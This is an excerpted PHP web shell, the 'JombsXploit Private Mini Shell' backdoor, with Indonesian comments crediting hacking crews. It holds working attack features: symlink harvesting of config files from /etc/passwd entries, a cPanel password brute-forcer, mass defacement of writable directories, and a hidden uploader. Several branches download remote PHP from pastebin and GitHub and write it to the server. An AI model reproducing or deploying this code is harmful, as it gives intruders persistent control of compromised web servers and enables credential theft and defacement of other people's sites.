...
/*
JombsXploit 2kl8 Backdoor
By Snoopy-Sec ID
*/

/*
Terimakasih Untuk Orang - Orang Yang Sudah Membantu Sehingga Terciptanya Web Shell Ini
Jujur Saja kami hanya memanfaatkan function dan tools yang di ambil dari shell yang sudah ada Sebelumnya. Jadi Shell Ini Tidak 100% Hasil Codingan Snoopy-SecID
Untuk AnonGhost, Gantengers Crew, Virusa Worm, S1r_V1ru5, Shor7cut, k2ll3d, IndoXploit, Sinkaroid, Ferupuk, 3xp1r3 Cyber Army, Stupidc0de, PenggilaCroot07 & Yang Lainnya Yang Tidak Bisa Saya Sebutkan Satu-Persatu Saya Ucapkan "ThankYou Verry Much" Atas Toolsnya. Saya Ucapkan Sekali Lagi Terimakasih.

Jika Ada Yang Kurang Berkenan dihati silahkan kontak saya di :
- Email : Snoopy76254@gmail.com
*/
...
';
echo "<center><br><font color='Crimson' size='6px' face='Fredericka the Great'>JOMBSXPLOIT PRIVATE MINI SHELL</font></center>";
echo "<center><font color='silver' siz='4px' face='Fredericka the Great'>[+] By Snoopy-Sec ID [+]</font></center><br/>";
...
[<a href="?<?php echo "path=".$path; ?>&amp;x=vn">Symlink</a>] <font color=orange>=</font>
...
$passwd=explode("\n",$passwd);
echo "<br><br><center><font face='Homenaje' color=Crimson size=2pt>Sebentar kak Lagi Di Proses ..</center><br>";
...
echo '<b><font face="Homenaje" color="springgreen" size="3pt"><b>Selesai kak Silakan Hajar :) >></b> <a target="_blank" href="JombsXploit-Conf">Hajar Config</a></font></b>';}
break;
}
/////// Cukup Sampai Disini Aja  :( ////////
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			...
			if(isset($_POST['usernames']) && isset($_POST['passwords']))
			{
			    ...
			    echo "<hr><b>You Found <font color=red>$ok</font> By JombsXploit</b>";
...
function sabun_massal($path,$namafile,$isi_script) {
				...
				if($pathb === '.') {
					...
					if(is_dir($pathc)) {
						if(is_writable($pathc)) {
							echo "<font class='ketengah'><font color=crimson>-:-</font><font color=white>Sukses Kak :) </font><font color=crimson>-:-</font> <font color=springgreen>Cek di :</font> $lokasi</font><br>";
							file_put_contents($lokasi, $isi_script);
	...
	<tr>
		...
		<td align='center'>:</td>
		<td><input class='justborder' type='text' name='d_file' value='index.php' style='width: 95%;' height='10'><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><font style='text-decoration: underline;'>Script Deface : </font><br></td>
	</tr>
	<tr>
	<td colspan='3'><textarea class='justborder' name='script' style='width: 500px; height: 200px;'>Hacked by Snoopy-Sec!</textarea><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;'><br/></td>
			...
			<tr><td>User/Password</td><td><input class="justborder" type="text" name="username" size="25" value="Snoopy-Sec"> /
			<input class="justborder" type="text" name="password" size="25" value="JombsXploit"></td></tr></table>
		...
		{
					echo "<br/><br/>Dipilih kak Toolsnya :) <br/><br/>";
					?>
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'tentang'))
		{
				echo"<br><br>
					<center><b>
			<font face='Jolly Lodger' color='white' size='6px'> [+] JOMBS<font color='teal'>X</font>PLOIT CREW [+]</font><br>
					<br>
			<font face='Fredericka The Great' color='white' size='3px'>Shell From Stupidc0de Family<br>Recoded Shell By Snoopy-Sec ID<br><br>
			-:- No Leader We Just Laugh Together -:-</font><br><br>
			<font color='gray'> Copyright 2018 | Contact Us: Snoopy76254@gmail.com </font><br><br><br>
			</center>
					</b>";
					break;
		}
			...
			elseif(isset($_GET['x']) && ($_GET['x'] == 'cpanel'))
				{
					echo "<br/><br/>Ayo pilih Toolsnya Kak :)<br/><br/>";
				?>
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'vn'))
					...
					<center><h2>Symlink</h2></center><br><br>
					<?php
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
				...
				if ( $pilih == "dumper") {
					$files = file_get_contents("https://pastebin.com/raw/qpbJkPGk");
			...
			/* Interface By Putra-Attacker*/
		{
				if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
				{
					...
					echo "<br><br><font color='springgreen' face='Fredericka The Great'>TOOLS GAK BISA DI PAKE KAK SERVERNYA BUKAN WINDOWS :(</font>";
				}break;
		}
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'fcrot'))
			{
				...
				<option value="hidden upload">Hidden Uploader</option>
				...
				if(isset($submit)) {
					...
					$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sc0hsphere.php");
						...
						die();
							...
							elseif ( $pilih == 'hidden upload') {
					$files = file_get_contents("https://raw.githubusercontent.com/Snoopy-Sec/MiniUploaderSNP/master/UploaderSNP.php");
						file_put_contents("Hidden.php",$files);
						echo "<script>alert('Hidden uploader created!'); hideAll();</script>";
						echo "<a href="."Hidden.php"." target=_blank><b>Hidden.php [Click here]</b></a></center>";
						die();
						}
...
///////////////////////////
			...
			mkdir('bysyswsf', 0755);
			chdir('bysyswsf');
			$bysyswsf = file_get_contents("https://pastebin.com/raw/KTXF5PQy");
			...
			elseif(isset($_GET['x']) && ($_GET['x'] == 'bypsini')) {
					...
					echo "<script>alert('Congrats! Sukses Kak'); hideAll();</script>";
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'jumping')){
				...
				echo "<font class='rapihbanget'>[+] Sikat Senpai !!\n"."<br /></font>";
...
?>
<br/><br/>
<script language="JavaScript"> Year=new Date(); var copyright=Year.getUTCFullYear(); document.write("<font face='Fredericka the Great' size='3px' color='grey'>&copy; JombsXploit Crew  " + copyright +"</font> "); </script>
</BODY></html>
